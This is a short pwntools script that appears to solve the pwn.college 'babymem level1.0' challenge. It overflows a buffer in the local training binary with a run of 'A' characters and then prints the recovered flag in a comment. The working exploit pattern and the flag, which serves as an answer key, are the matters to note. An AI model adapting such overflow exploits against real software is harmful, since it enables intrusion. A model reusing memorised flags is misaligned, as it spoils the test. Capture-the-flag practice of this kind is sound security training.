#!/usr/bin/env python3
from pwn import *

io = process('/challenge/babymem_level1.0')
io.recvuntil(b'Payload size:')
io.sendline(f'{30}')
io.recvuntil(b'!')
io.sendline('A'*29)
io.interactive()

"""
You win! Here is your flag:
pwn.college{8EtUy6-KNI-PAexlLbO2GDvRk8d.QX5gjMsETNzczW}

"""